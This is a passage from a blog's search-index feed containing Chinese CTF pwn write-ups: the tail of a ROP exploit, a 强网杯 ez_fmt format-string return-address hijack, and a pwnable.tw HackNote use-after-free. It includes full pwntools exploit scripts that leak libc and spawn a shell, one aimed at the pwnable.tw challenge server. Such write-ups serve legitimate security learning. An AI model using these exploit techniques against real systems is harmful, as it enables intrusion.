class="string">&quot;47.100.139.115&quot;</span>,<span class="number">30530</span>)</span><br><span class="line">elf2=ELF(<span class="string">&quot;./vuln&quot;</span>)</span><br><span class="line">elf=ctypes.cdll.LoadLibrary(<span class="string">&quot;./libc.so.6&quot;</span>)</span><br><span class="line">elf.srand(<span class="number">0</span>)</span><br><span class="line">payload=<span class="string">b&quot;a&quot;</span>*<span class="number">10</span>+p64(<span class="number">0</span>)</span><br><span class="line">p.sendafter(<span class="string">&quot;name.&quot;</span>,payload)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">99</span>):</span><br><span class="line">    payload=elf.rand()%<span class="number">100</span>+<span class="number">1</span></span><br><span class="line">    p.sendafter(<span class="string">&quot;number:&quot;</span>,p64(payload))</span><br><span class="line">s=p.recvuntil(<span class="string">&quot;mind.&quot;</span>,timeout=<span class="number">10</span>)</span><br><span class="line"><span class="built_in">print</span>(s)  </span><br><span class="line">rdi=<span class="number">0x0000000000401423</span></span><br><span class="line">myread=<span class="number">0x401262</span></span><br><span class="line">payload=<span class="string">b&quot;a&quot;</span>*<span class="number">0x38</span>+p64(rdi)+p64(elf2.got[<span class="string">&quot;puts&quot;</span>])+p64(elf2.plt[<span class="string">&quot;puts&quot;</span>])+p64(myread)</span><br><span class="line">p.send(payload)</span><br><span class="line">puts_addr=u64(p.recvuntil(<span class="string">b&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line">libc=ELF(<span class="string">&quot;./libc.so.6&quot;</span>)</span><br><span class="line">libc_base=puts_addr-libc.sym[<span class="string">&quot;puts&quot;</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(libc_base))</span><br><span class="line">one=<span class="number">0xe3b04</span></span><br><span class="line">sleep(<span class="number">0.5</span>)</span><br><span class="line">system=libc.sym[<span class="string">&quot;system&quot;</span>]+libc_base</span><br><span class="line">bin_sh=libc_base+<span class="built_in">next</span>(libc.search(<span class="string">b&quot;/bin/sh\x00&quot;</span>))</span><br><span class="line">payload=<span class="string">b&quot;a&quot;</span>*<span class="number">0x38</span>+p64(rdi)+p64(bin_sh)+p64(system)</span><br><span class="line">p.send(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>强网杯ez_fmt复现</title>
      <link href="/posts/ez_fmt.html"/>
      <url>/posts/ez_fmt.html</url>
      
        <content type="html"><![CDATA[<h2 id="ez-fmt"><a href="#ez-fmt" class="headerlink" title="ez_fmt"></a>ez_fmt</h2><p>本来想着用格式化字符串低位爆破，不过看了别的师傅的文章，似乎有更为巧妙的思路。<br>先给大家看看题目</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">nt __cdecl main(int argc, const char **argv, const char **envp)</span><br><span class="line">&#123;</span><br><span class="line">  char buf[88]; // [rsp+0h] [rbp-60h] BYREF</span><br><span class="line">  unsigned __int64 v5; // [rsp+58h] [rbp-8h]</span><br><span class="line"></span><br><span class="line">  v5 = __readfsqword(0x28u);</span><br><span class="line">  setvbuf(stdout, 0LL, 2, 0LL);</span><br><span class="line">  setvbuf(stdin, 0LL, 2, 0LL);</span><br><span class="line">  printf(&quot;There is a gift for you %p\n&quot;, buf);</span><br><span class="line">  read(0, buf, 0x30uLL);</span><br><span class="line">  if ( w == 0xFFFF )</span><br><span class="line">  &#123;</span><br><span class="line">    printf(buf);</span><br><span class="line">    w = 0;</span><br><span class="line">  &#125;</span><br><span class="line">  return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>题目逻辑很简单，给了一个栈上的地址，然后有个只能利用一次的格式化字符串漏洞，这里如果想要在泄露libc基址，并同时劫持main的返回地址和w，0x30个字节显然是不够的，所以要另辟蹊径，尝试劫持<strong>子函数的返回地址</strong>，我们知道，在调用一个函数前,要先push rip，push rbp,把当前函数的执行状态和堆栈保留下来，而这里，题目把一个栈上的地址给我们，劫持子函数的返回地址是办得到的，gdb发现printf(buf)的返回地址刚好就在rsp上方，也就是rsp-8的位置，那我们就可以通过格式化字符串修改这个返回地址，从而控制整个程序。</p><h2 id="执行到printf-buf-时的栈"><a href="#执行到printf-buf-时的栈" class="headerlink" title="执行到printf(buf)时的栈"></a>执行到printf(buf)时的栈</h2><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">00:0000│ rsp     0x7fffe5c1e828 —▸ 0x40123e (main+168) ◂— mov dword ptr [rip + 0x2dc8], 0</span><br><span class="line">01:0008│ rdi rsi 0x7fffe5c1e830 ◂— 0x2438256336303225 (&#x27;%206c%8$&#x27;)</span><br><span class="line">02:0010│         0x7fffe5c1e838 ◂— 0x70243931256e6868 (&#x27;hhn%19$p&#x27;)</span><br><span class="line">03:0018│         0x7fffe5c1e840 —▸ 0x7fffe5c1e828 —▸ 0x40123e (main+168) ◂— mov dword ptr [rip + 0x2dc8], 0</span><br><span class="line">04:0020│         0x7fffe5c1e848 —▸ 0x401205 (main+111) ◂— lea rax, [rbp - 0x60]</span><br><span class="line">05:0028│         0x7fffe5c1e850 —▸ 0x7f71461015e0 ◂— endbr64 </span><br><span class="line">06:0030│         0x7fffe5c1e858 —▸ 0x4012bd (<span class="strong">__libc<span class="emphasis">_csu_</span>init+77) ◂— add rbx, 1</span></span><br><span class="line"><span class="strong">07:0038│         0x7fffe5c1e860 —▸ 0x7f71460fc2e8 ◂— 0x0</span></span><br><span class="line"><span class="strong">08:0040│         0x7fffe5c1e868 —▸ 0x401270 (__</span>libc<span class="emphasis">_csu_</span>init) ◂— endbr64 </span><br><span class="line">09:0048│         0x7fffe5c1e870 ◂— 0x0</span><br><span class="line">0a:0050│         0x7fffe5c1e878 —▸ 0x4010b0 (<span class="emphasis">_start) ◂— endbr64 </span></span><br><span class="line"><span class="emphasis">0b:0058│         0x7fffe5c1e880 —▸ 0x7fffe5c1e980 ◂— 0x1</span></span><br><span class="line"><span class="emphasis">0c:0060│         0x7fffe5c1e888 ◂— 0xf4bc6e9f9994b300</span></span><br><span class="line"><span class="emphasis">0d:0068│ rbp     0x7fffe5c1e890 ◂— 0x0</span></span><br><span class="line"><span class="emphasis">0e:0070│         0x7fffe5c1e898 —▸ 0x7f7145f2f083 (<span class="strong">__libc_start_main+243) ◂— mov edi, eax</span></span></span><br></pre></td></tr></table></figure><p>我们可以看到此时push了一个返回地址上去，<del>0x40123e</del>,这就是我们要劫持的返回地址了，当然，劫持一个可能还不够，为了实现rop，我们至少需要写0x18个字节进去，但这里buf有长度限制，仅用格式化字符串显然是不够的。显然需要换一种思路。我们知道,ret相当于pop rip,那也就是说只需要把rsp控制到我们写入的位置就可以了，这里为了避免格式化字符串和我们写入的返回地址冲突，我们用<del>libc_csu_init</del>中的gadget来控制rsp。需要注意的是，在rop之前我们需要先泄露一个libc函数的地址来拿到libc_base。这一步可以放到格式化字符串那一步做。csu的pop执行完后，我们就可以利用ret来继续劫持程序流。<br><strong>所以我们的总体思路就是</strong>:<del>格式化字符串劫持子函数的返回地址到libc_csu_init</del>-&gt;<del>利用其中的pop|ret劫持程序流到read</del>-&gt;<del>利用read写入rop链，同时劫持read函数的返回地址</del></p><h2 id="exp"><a href="#exp" class="headerlink" title="exp:"></a>exp:</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#from LibcSearcher import *</span></span><br><span class="line">p=process(<span class="string">&quot;./ez_fmt&quot;</span>)</span><br><span class="line">libc=ELF(<span class="string">&quot;./libc-2.31.so&quot;</span>)</span><br><span class="line">gdb.attach(p)</span><br><span class="line">p.recvuntil(<span class="string">b&quot;0x&quot;</span>)</span><br><span class="line">buf_addr=<span class="string">&quot;0x&quot;</span>+p.recvuntil(<span class="string">&quot;\n&quot;</span>)[:-<span class="number">1</span>].decode(<span class="string">&quot;utf-8&quot;</span>)</span><br><span class="line">buf_addr=<span class="built_in">int</span>(buf_addr,<span class="number">16</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(buf_addr))</span><br><span class="line">read_addr=<span class="number">0x401205</span></span><br><span class="line">offset=<span class="number">0x18</span></span><br><span class="line">payload=<span class="string">b&quot;%206c%8$hhn%19$p&quot;</span>+p64(buf_addr-<span class="number">8</span>)+p64(read_addr)</span><br><span class="line">payload.ljust(<span class="number">0x30</span>,<span class="string">b&quot;a&quot;</span>)</span><br><span class="line">p.send(payload)</span><br><span class="line">p.recvuntil(<span class="string">&quot;0x&quot;</span>)</span><br><span class="line">libc_base=<span class="built_in">int</span>(<span class="string">&quot;0x&quot;</span>+p.recv(<span class="number">12</span>).decode(<span class="string">&quot;utf-8&quot;</span>),<span class="number">16</span>)-libc.sym[<span class="string">&quot;__libc_start_main&quot;</span>]-<span class="number">243</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(libc_base))</span><br><span class="line">pop_rdi=<span class="number">0x00000000004012d3</span></span><br><span class="line">system=libc_base+libc.sym[<span class="string">&quot;system&quot;</span>]</span><br><span class="line">bin_sh=libc_base+<span class="built_in">next</span>(libc.search(<span class="string">b&quot;/bin/sh\x00&quot;</span>))</span><br><span class="line">one=<span class="number">0xe3b04</span></span><br><span class="line">payload=<span class="string">b&quot;a&quot;</span>*<span class="number">0x18</span>+p64(pop_rdi)+p64(bin_sh)+p64(libc_base+<span class="number">0x051CD2</span>)</span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line"><span class="comment">#payload=b&quot;a&quot;*0x18+p64(one)</span></span><br><span class="line">p.send(payload)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(bin_sh))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p><strong>参考文献</strong>:<a href="https://www.cnblogs.com/S1nyer/p/17914751.html">https://www.cnblogs.com/S1nyer/p/17914751.html</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> -子函数劫持 -格式化字符串 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HackNote</title>
      <link href="/posts/HackNote.html"/>
      <url>/posts/HackNote.html</url>
      
        <content type="html"><![CDATA[<h2 id="Hacknote"><a href="#Hacknote" class="headerlink" title="Hacknote"></a>Hacknote</h2><p>对于入门堆的师傅来说，这是个不错的入门题，但pwnabletw上扣了符号表，gdb调试起来比较麻烦，建议先做攻防世界上的，我们先看看ida反编译出来的代码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">void __cdecl __noreturn main()</span><br><span class="line">&#123;</span><br><span class="line">  int v0; // eax</span><br><span class="line">  char buf[4]; // [esp+8h] [ebp-10h] BYREF</span><br><span class="line">  unsigned int v2; // [esp+Ch] [ebp-Ch]</span><br><span class="line"></span><br><span class="line">  v2 = __readgsdword(0x14u);</span><br><span class="line">  setvbuf(stdout, 0, 2, 0);</span><br><span class="line">  setvbuf(stdin, 0, 2, 0);</span><br><span class="line">  while ( 1 )</span><br><span class="line">  &#123;</span><br><span class="line">    while ( 1 )</span><br><span class="line">    &#123;</span><br><span class="line">      all_choice();</span><br><span class="line">      read(0, buf, 4u);</span><br><span class="line">      v0 = atoi(buf);                           // get choice</span><br><span class="line">      if ( v0 != 2 )</span><br><span class="line">        break;</span><br><span class="line">      delete();</span><br><span class="line">    &#125;</span><br><span class="line">    if ( v0 &gt; 2 )</span><br><span class="line">    &#123;</span><br><span class="line">      if ( v0 == 3 )</span><br><span class="line">      &#123;</span><br><span class="line">        print_note();</span><br><span class="line">      &#125;</span><br><span class="line">      else</span><br><span class="line">      &#123;</span><br><span class="line">        if ( v0 == 4 )</span><br><span class="line">          exit(0);</span><br><span class="line">LABEL_13:</span><br><span class="line">        puts(&quot;Invalid choice&quot;);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    else</span><br><span class="line">    &#123;</span><br><span class="line">      if ( v0 != 1 )</span><br><span class="line">        goto LABEL_13;</span><br><span class="line">      add_note();</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>比较经典的形式，这里的重点在三个函数上，我们一起看看</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br></pre></td><td class="code"><pre><span class="line">unsigned int add_note()</span><br><span class="line">&#123;</span><br><span class="line">  int v0; // ebx</span><br><span class="line">  int i; // [esp+Ch] [ebp-1Ch]</span><br><span class="line">  int size; // [esp+10h] [ebp-18h]</span><br><span class="line">  char buf[8]; // [esp+14h] [ebp-14h] BYREF</span><br><span class="line">  unsigned int v5; // [esp+1Ch] [ebp-Ch]</span><br><span class="line"></span><br><span class="line">  v5 = __readgsdword(0x14u);</span><br><span class="line">  if ( limit &lt;= 5 )</span><br><span class="line">  &#123;</span><br><span class="line">    for ( i = 0; i &lt;= 4; ++i )</span><br><span class="line">    &#123;</span><br><span class="line">      if ( !*(&amp;ptr + i) )</span><br><span class="line">      &#123;</span><br><span class="line">        *(&amp;ptr + i) = malloc(8u);</span><br><span class="line">        if ( !*(&amp;ptr + i) )</span><br><span class="line">        &#123;</span><br><span class="line">          puts(&quot;Alloca Error&quot;);</span><br><span class="line">          exit(-1);</span><br><span class="line">        &#125;</span><br><span class="line">        *(_DWORD *)*(&amp;ptr + i) = puts_a;</span><br><span class="line">        printf(&quot;Note size :&quot;);</span><br><span class="line">        read(0, buf, 8u);</span><br><span class="line">        size = atoi(buf);</span><br><span class="line">        v0 = (int)*(&amp;ptr + i);</span><br><span class="line">        *(_DWORD *)(v0 + 4) = malloc(size);</span><br><span class="line">        if ( !*((_DWORD *)*(&amp;ptr + i) + 1) )</span><br><span class="line">        &#123;</span><br><span class="line">          puts(&quot;Alloca Error&quot;);</span><br><span class="line">          exit(-1);</span><br><span class="line">        &#125;</span><br><span class="line">        printf(&quot;Content :&quot;);</span><br><span class="line">        read(0, *((void **)*(&amp;ptr + i) + 1), size);</span><br><span class="line">        puts(&quot;Success !&quot;);</span><br><span class="line">        ++limit;</span><br><span class="line">        return __readgsdword(0x14u) ^ v5;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  else</span><br><span class="line">  &#123;</span><br><span class="line">    puts(&quot;Full&quot;);</span><br><span class="line">  &#125;</span><br><span class="line">  return __readgsdword(0x14u) ^ v5;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">####delete</span><br><span class="line">unsigned int delete()</span><br><span class="line">&#123;</span><br><span class="line">  int v1; // [esp+4h] [ebp-14h]</span><br><span class="line">  char buf[4]; // [esp+8h] [ebp-10h] BYREF</span><br><span class="line">  unsigned int v3; // [esp+Ch] [ebp-Ch]</span><br><span class="line"></span><br><span class="line">  v3 = __readgsdword(0x14u);</span><br><span class="line">  printf(&quot;Index :&quot;);</span><br><span class="line">  read(0, buf, 4u);</span><br><span class="line">  v1 = atoi(buf);</span><br><span class="line">  if ( v1 &lt; 0 || v1 &gt;= limit )</span><br><span class="line">  &#123;</span><br><span class="line">    puts(&quot;Out of bound!&quot;);</span><br><span class="line">    _exit(0);</span><br><span class="line">  &#125;</span><br><span class="line">  if ( *(&amp;ptr + v1) )</span><br><span class="line">  &#123;</span><br><span class="line">    free(*((void **)*(&amp;ptr + v1) + 1));</span><br><span class="line">    free(*(&amp;ptr + v1));</span><br><span class="line">    puts(&quot;Success&quot;);</span><br><span class="line">  &#125;</span><br><span class="line">  return __readgsdword(0x14u) ^ v3;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">####print_note</span><br><span class="line">unsigned int print_note()</span><br><span class="line">&#123;</span><br><span class="line">  int v1; // [esp+4h] [ebp-14h]</span><br><span class="line">  char buf[4]; // [esp+8h] [ebp-10h] BYREF</span><br><span class="line">  unsigned int v3; // [esp+Ch] [ebp-Ch]</span><br><span class="line"></span><br><span class="line">  v3 = __readgsdword(0x14u);</span><br><span class="line">  printf(&quot;Index :&quot;);</span><br><span class="line">  read(0, buf, 4u);</span><br><span class="line">  v1 = atoi(buf);</span><br><span class="line">  if ( v1 &lt; 0 || v1 &gt;= limit )</span><br><span class="line">  &#123;</span><br><span class="line">    puts(&quot;Out of bound!&quot;);</span><br><span class="line">    _exit(0);</span><br><span class="line">  &#125;</span><br><span class="line">  if ( *(&amp;ptr + v1) )</span><br><span class="line">    (*(void (__cdecl **)(_DWORD))*(&amp;ptr + v1))(*(&amp;ptr + v1));</span><br><span class="line">  return __readgsdword(0x14u) ^ v3;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>仔细看可以发现，delete节点后这里没有把指针置为NULL,也没有对note数量进行减操作，delete后的note仍然可以通过print_note来访问，很明显是存在uaf(Use-after-free)漏洞的。<br>我们继续看add的逻辑，发现这个程序在生成一个content节点之前，会先申请一个chunk存放puts的地址和content chunk的地址。那现在，我们已经有大概的思路了，首先由于index chunk的申请大小小于0x10，所以在free之后它会归fastbin管理，fastbin是个单向链表，遵循先进后出原则（最后一个free的chunk会被优先分配）。那么我们就可以先申请两个大于0x20的note,记为note0,note1。index chunk 记为index0,index1。再将他们delete,由于note大于0x20,所以此时我们的fastbin是:index0-&gt;index1,此时我们再去申请一个小于0xf的chunk(add_note),那么这个note的chunk就会从fastbin中取，这个note我们记为<strong>note3: index : index0, content:index1</strong> 此时我们就可以向index1里面写一些函数的地址 ，然后调用了。 知道原理后 ，这就是一个简单的32位ret2libc。<br/><br>###exp:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">context(arch=&quot;i386&quot;,os=&quot;linux&quot;)</span><br><span class="line">#p=process(&quot;./hacknote&quot;)</span><br><span class="line">p=remote(&quot;chall.pwnable.tw&quot;,10102)</span><br><span class="line">elf=ELF(&quot;./hacknote&quot;)</span><br><span class="line">def add_note(size,content):</span><br><span class="line">    p.sendafter(&quot;Your choice :&quot;,str(1))</span><br><span class="line">    p.sendafter(&quot;size :&quot;,str(size))</span><br><span class="line">    p.sendafter(&quot;Content :&quot;,content)</span><br><span class="line">def delete_note(index):</span><br><span class="line">    p.sendafter(&quot;Your choice :&quot;,str(2))</span><br><span class="line">    p.sendafter(&quot;Index :&quot;,str(index))</span><br><span class="line">def print_note(index):</span><br><span class="line">    p.sendafter(&quot;Your choice :&quot;,str(3))</span><br><span class="line">    p.sendafter(&quot;Index :&quot;,str(index))</span><br><span class="line">def get_out():</span><br><span class="line">    p.sendafter(&quot;Your choice :&quot;,str(4))</span><br><span class="line">libc=ELF(&quot;./libc_32.so.6&quot;)</span><br><span class="line">#gdb.attach(p)</span><br><span class="line">add_note(size=0x50,content=b&quot;aaaa&quot;) #note 0</span><br><span class="line">add_note(size=0x50,content=b&quot;aaaa&quot;)# note 1</span><br><span class="line">delete_note(1) #delete note 1</span><br><span class="line">delete_note(0) #delete note 0</span><br><span class="line">read_got=elf.got[&quot;read&quot;]</span><br><span class="line">puts=0x804862B</span><br><span class="line">payload=p32(puts)+p32(read_got)</span><br><span class="line">add_note(size=0x8,content=payload)</span><br><span class="line">print_note(1)</span><br><span class="line">read_addr=int.from_bytes(p.recv(4),byteorder=&quot;little&quot;)</span><br><span class="line">libc_base=read_addr-libc.sym[&quot;read&quot;]</span><br><span class="line">print(hex(libc_base))</span><br><span class="line">system=libc.sym[&quot;system&quot;]+libc_base</span><br><span class="line">bin_sh=libc_base+next(libc.search(b&quot;/bin/sh&quot;))</span><br><span class="line">payload=p32(system)+b&quot;;sh\0&quot;</span><br><span class="line">#add_note(size=0x20,content=b&quot;aaaa&quot;)</span><br><span class="line">delete_note(2)</span><br><span class="line">#delete_note(3)</span><br><span class="line">add_note(size=0x8,content=payload)</span><br><span class="line">print_note(1)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>如有错误，欢迎各位师傅指正。</p>]]></content>
      
      
      
    </entry>
    
    
  
  
    
  
</search>
